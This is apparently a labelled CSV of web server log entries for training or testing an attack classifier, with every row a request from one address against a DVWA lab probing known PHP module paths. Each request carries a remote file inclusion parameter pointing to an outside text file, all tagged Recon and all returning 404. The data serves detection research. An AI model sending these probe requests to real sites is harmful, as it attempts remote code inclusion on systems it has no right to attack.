ip,identity,user,timestamp,request,status,size,referer,user_agent,vulnerability,method,url,protocol,request_length,url_parts,user_agent_length,Predicted_Vulnerability
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/mod_calendar.php?absolute_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,488,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/mod_calendar.php?absolute_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,113,10,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/mod_flatmenu.php?mosConfig_absolute_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,488,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/mod_flatmenu.php?mosConfig_absolute_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,123,10,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/mod_mainmenu.php?mosConfig_absolute_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,488,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/mod_mainmenu.php?mosConfig_absolute_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,123,10,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/mod_weather.php?absolute_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,488,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/mod_weather.php?absolute_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,112,10,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/mod_weather.php?absolute_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,488,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/mod_weather.php?absolute_path=http://cirt.net/public/rfiinc.txt?,HTTP/1.1,113,10,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/mx_smartor/admin/admin_album_otf.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,488,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/mx_smartor/admin/admin_album_otf.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,135,12,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/mx_smartor/admin/admin_album_otf.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,488,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/mx_smartor/admin/admin_album_otf.php?phpbb_root_path=http://cirt.net/public/rfiinc.txt?,HTTP/1.1,136,12,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/newbb_plus/config.php?bbPath[root_theme]=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,453,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/newbb_plus/config.php?bbPath[root_theme]=http://cirt.net/public/rfiinc.txt,HTTP/1.1,123,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/newbb_plus/votepolls.php?bbPath[path]=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,490,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/newbb_plus/votepolls.php?bbPath[path]=http://cirt.net/public/rfiinc.txt,HTTP/1.1,120,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/news/blocks/latest_news.php?system[path]=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/news/blocks/latest_news.php?system[path]=http://cirt.net/public/rfiinc.txt,HTTP/1.1,123,12,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/newusergreatings/pm_newreg.php?exbb[home_path]=http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/newusergreatings/pm_newreg.php?exbb[home_path]=http://cirt.net/public/rfiinc.txt?,HTTP/1.1,130,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/organizations/index.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/organizations/index.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,116,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/phones/index.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/phones/index.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,109,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/pms/index.php?module_path=http://cirt.net/public/rfiinc.txt??? HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/pms/index.php?module_path=http://cirt.net/public/rfiinc.txt???,HTTP/1.1,111,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/poll/inlinepoll.php?language_home=&rootdp=zZz&gsLanguage=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/poll/inlinepoll.php?language_home=&rootdp=zZz&gsLanguage=http://cirt.net/public/rfiinc.txt,HTTP/1.1,139,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/poll/showpoll.php?language_home=&rootdp=zZz&gsLanguage=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/poll/showpoll.php?language_home=&rootdp=zZz&gsLanguage=http://cirt.net/public/rfiinc.txt,HTTP/1.1,137,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir=http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir=http://cirt.net/public/rfiinc.txt?,HTTP/1.1,139,13,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/presence/index.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/presence/index.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,111,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/projects/index.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/projects/index.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,111,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/projects/list.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/projects/list.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,110,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/projects/summary.inc.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/projects/summary.inc.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,117,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/punish/p_error.php?exbb[home_path]=http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/punish/p_error.php?exbb[home_path]=http://cirt.net/public/rfiinc.txt?,HTTP/1.1,118,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/punish/profile.php?exbb[home_path]=http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/punish/profile.php?exbb[home_path]=http://cirt.net/public/rfiinc.txt?,HTTP/1.1,118,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/reports/index.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/reports/index.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,110,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/search/index.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/search/index.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,109,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/search/search.php?language_home=&rootdp=zZz&gsLanguage=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/search/search.php?language_home=&rootdp=zZz&gsLanguage=http://cirt.net/public/rfiinc.txt,HTTP/1.1,137,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/search/search.php?language_home=&rootdp=zZz&gsLanguage=http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/search/search.php?language_home=&rootdp=zZz&gsLanguage=http://cirt.net/public/rfiinc.txt?,HTTP/1.1,138,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/settings/headerfile.php?system[path]=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/settings/headerfile.php?system[path]=http://cirt.net/public/rfiinc.txt,HTTP/1.1,119,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/snf/index.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/snf/index.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,106,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/syslog/index.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/syslog/index.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,109,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/tasks/index.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/tasks/index.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,108,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/tasks/searchsimilar.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/tasks/searchsimilar.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,116,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/tasks/summary.inc.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/tasks/summary.inc.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,114,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/threadstop/threadstop.php?exbb[home_path]=http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/threadstop/threadstop.php?exbb[home_path]=http://cirt.net/public/rfiinc.txt?,HTTP/1.1,125,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/tinycontent/admin/spaw/spaw_control.class.php?spaw_root=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/tinycontent/admin/spaw/spaw_control.class.php?spaw_root=http://cirt.net/public/rfiinc.txt,HTTP/1.1,138,13,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/tml/block.tag.php?GLOBALS[PTH][classes]=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/tml/block.tag.php?GLOBALS[PTH][classes]=http://cirt.net/public/rfiinc.txt,HTTP/1.1,122,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/tsdisplay4xoops/blocks/tsdisplay4xoops_block2.php?xoops_url=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/tsdisplay4xoops/blocks/tsdisplay4xoops_block2.php?xoops_url=http://cirt.net/public/rfiinc.txt,HTTP/1.1,142,12,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/useradm/index.php?full_path=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/useradm/index.php?full_path=http://cirt.net/public/rfiinc.txt,HTTP/1.1,110,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/users/headerfile.php?system[path]=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/users/headerfile.php?system[path]=http://cirt.net/public/rfiinc.txt,HTTP/1.1,116,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/vWar_Account/includes/functions_common.php?vwar_root2=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/vWar_Account/includes/functions_common.php?vwar_root2=http://cirt.net/public/rfiinc.txt,HTTP/1.1,136,12,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/visitors2/include/config.inc.php?lvc_include_dir=http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/visitors2/include/config.inc.php?lvc_include_dir=http://cirt.net/public/rfiinc.txt?,HTTP/1.1,132,12,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/vwar/convert/mvcw_conver.php?step=1&vwar_root=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/vwar/convert/mvcw_conver.php?step=1&vwar_root=http://cirt.net/public/rfiinc.txt,HTTP/1.1,128,12,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/wiwimod/spaw/spaw_control.class.php?spaw_root=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/wiwimod/spaw/spaw_control.class.php?spaw_root=http://cirt.net/public/rfiinc.txt,HTTP/1.1,128,12,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/xfsection/modify.php?dir_module=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/xfsection/modify.php?dir_module=http://cirt.net/public/rfiinc.txt,HTTP/1.1,114,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/xgallery/upgrade_album.php?GALLERY_BASEDIR=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/xgallery/upgrade_album.php?GALLERY_BASEDIR=http://cirt.net/public/rfiinc.txt,HTTP/1.1,125,11,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/xt_conteudo/admin/spaw/spaw_control.class.php?spaw_root=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/xt_conteudo/admin/spaw/spaw_control.class.php?spaw_root=http://cirt.net/public/rfiinc.txt,HTTP/1.1,138,13,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modules/xt_conteudo/admin/spaw/spaw_control.class.php?spaw_root=http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modules/xt_conteudo/admin/spaw/spaw_control.class.php?spaw_root=http://cirt.net/public/rfiinc.txt?,HTTP/1.1,139,13,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modulistica/mdl_save.php?CLASSPATH=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modulistica/mdl_save.php?CLASSPATH=http://cirt.net/public/rfiinc.txt,HTTP/1.1,109,10,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/modx-0.9.6.2/assets/snippets/reflect/snippet.reflect.php?reflect_base=http://cirt.net/public/rfiinc.txt? HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/modx-0.9.6.2/assets/snippets/reflect/snippet.reflect.php?reflect_base=http://cirt.net/public/rfiinc.txt?,HTTP/1.1,145,13,115,Recon
12.12.12.12,-,-,2024-06-30 14:49:10-04:00,GET /DVWA/vulnerabilities/brute/moodle/admin/utfdbmigrate.php?cmd=http://cirt.net/public/rfiinc.txt HTTP/1.1,404,489,-,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",Recon,GET,/DVWA/vulnerabilities/brute/moodle/admin/utfdbmigrate.php?cmd=http://cirt.net/public/rfiinc.txt,HTTP/1.1,108,11,115,Recon
